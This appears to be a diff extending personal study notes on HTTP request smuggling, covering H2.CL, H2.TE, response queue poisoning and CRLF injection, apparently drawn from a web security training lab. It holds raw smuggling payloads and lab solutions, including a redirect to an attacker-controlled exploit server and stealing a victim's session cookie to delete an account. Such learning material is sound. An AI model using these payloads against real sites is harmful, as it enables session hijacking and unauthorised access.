@@ -314,8 +314,116 @@ Exploit:
 
 
 Advanced request smuggling:
-- HTTP/2 message length:
-    + Request smuggling is fundamentally about exploit discrepancies
+- HTTP/2:
+    + HTTP/2 messages sent as series of separate "frames", each with explicit length field, tell server exactly hơ many bytes to read
+    + Request length = sum of frame length -> no ambiguity -> immune to smuggling in theory
+    + But only if HTTP/2 end-to-end - HTTP/2 downgrading breaks the protect
+- H2.CL vuln: (13)
+    + HTTP/2 don't specify their length in header
+    + During downgrading, FE add CL header derived from HTTP/2 built in frame length
+    + But HTTP/2 can also include their own CL header and reuse it in HTTP/1 request
+        + RFC: CL must match built in length, but this isn't always validated properly before downgrading
+    + Exploit:
+        + FE uses HTTP/2 frame length, BE uses CL when downgrading to HTTP/1
+        + Example:
+            :method	        POST
+            :path	        /example
+            :authority	    vulnerable-website.com
+            content-type	application/x-www-form-urlencoded
+            content-length	0
+
+            GET /admin HTTP/1.1
+            Host: vulnerable-website.com
+            Content-Length: 10
+
+            x=1
+            ---------------Downgrade----------
+            POST /example HTTP/1.1
+            Host: vulnerable-website.com
+            Content-Type: application/x-www-form-urlencoded
+            Content-Length: 0
+
+            GET /admin HTTP/1.1
+            Host: vulnerable-website.com
+            Content-Length: 10
+
+            x=1GET / H
+- H2.TE vuln:
+    + Chunked transfer encoding is incompatible with HTTP/2 and recommend should be stripped entirely
+    + Exploit same as above but for TE
+    + Example:
+        :method	            POST
+        :path	            /example
+        :authority	        vulnerable-website.com
+        content-type	    application/x-www-form-urlencoded
+        transfer-encoding	chunked
+        
+        0
+
+        GET /admin HTTP/1.1
+        Host: vulnerable-website.com
+        Foo: bar
+        -----------------------------------------
+        POST /example HTTP/1.1
+        Host: vulnerable-website.com
+        Content-Type: application/x-www-form-urlencoded
+        Transfer-Encoding: chunked
+
+        0
+
+        GET /admin HTTP/1.1
+        Host: vulnerable-website.com
+        Foo: bar
+- Hidden HTTP/2 support:
+
+- Response queue poisoning: (14)
+    + Cause FE server to start mapping response from BE to wrong request
+        -> All users of same connection are served response that were intended for someone else
+    + Smuggle a complete request -> BE return 2 response, FE expect only 1 -> response is queued for next request
+    + How to construct:
+        + Require:
+            + TCP connection between FE and BE is reused for multiple request/response cycles
+            + Attacker can smuggle a complete request in standalone request
+            + Attack must not cause either server to close TCP connection
+        + Example smuggling a complete request:
+            -------------FE (CL)--------------
+            POST / HTTP/1.1\r\n
+            Host: vulnerable-website.com\r\n
+            Content-Type: x-www-form-urlencoded\r\n
+            Content-Length: 61\r\n
+            Transfer-Encoding: chunked\r\n
+            \r\n
+            0\r\n
+            \r\n
+            GET /anything HTTP/1.1\r\n
+            Host: vulnerable-website.com\r\n
+            \r\n
+            GET / HTTP/1.1\r\n
+            Host: vulnerable-website.com\r\n
+            \r\n
+            --------------BE (TE)----------------
+            POST / HTTP/1.1\r\n
+            Host: vulnerable-website.com\r\n
+            Content-Type: x-www-form-urlencoded\r\n
+            Content-Length: 61\r\n
+            Transfer-Encoding: chunked\r\n
+            \r\n
+            0\r\n
+            \r\n
+            GET /anything HTTP/1.1\r\n
+            Host: vulnerable-website.com\r\n
+            \r\n
+            GET / HTTP/1.1\r\n
+            Host: vulnerable-website.com\r\n
+            \r\n
+- Request smuggling via CRLF injection: (15)
+    + Even if web prevent by validate CL or stripping TE, still can exploit by using \n to smuggle prohibited headers
+    + If BE treat as delimiter, but FE does not -> some servers will fail to detect second header
+        Foo: bar\nTransfer-Encoding: chunked
+    + HTTP/1: handling full CRLF (\r\n) to terminate header
+    + HTTP/2: messages are binary, so boundaries of each header based on explicit, predetermined offsets rather than delimiter characters -> \r\n no longer special and can include inside value
+        foo	    bar\r\nTransfer-Encoding: chunked
+
 
 
 
@@ -538,3 +646,37 @@ Advanced request smuggling:
 
     GET /my-account HTTP/1.1
     Foo: X
+
+13_H2_CL_request_smuggling
+- Notice that if you try visit folder with slash at the end, will cause redirect
+    + Redirect 302 /resources -> /resources/
+- Just prefix request that cause open redirect to attacker's server
+- Payload:
+    POST / HTTP/2
+    Host: 0a31008204fa91ab807921530080009e.web-security-academy.net
+    Content-Type: 	application/x-www-form-urlencoded
+    Content-Length: 0
+
+    GET /resources HTTP/1.1
+    Host: exploit-0a100096046b918080d3200a01b100ed.exploit-server.net
+    Content-Type: 	application/x-www-form-urlencoded
+    Content-Length: 10
+
+    x=1
+
+14_Response_queue_poisoning_via_H2_TE_request_smuggling
+- In this lab, need to send request using HTTP/2
+    + When forward to BE, will downgrading and use TE header to determine boundary of request
+    + FE sees 1 request, BE sees 2 request, but only expect to return 1 response -> 1 response will still remain in queue
+    + Next user request will get that response and make wrong mapping between request, response
+- Just send request until get response of victim, get cookies in Set-cookie header and use that to delete carlos account
+- Payload:
+    POST / HTTP/2
+    Host: 0ad300bf03ffe4db812c8a5900ea002d.web-security-academy.net
+    Transfer-Encoding: chunked
+
+    0
+
+    GET /404 HTTP/1.1
+    Host: 0ad300bf03ffe4db812c8a5900ea002d.web-security-academy.net
+    \r\n
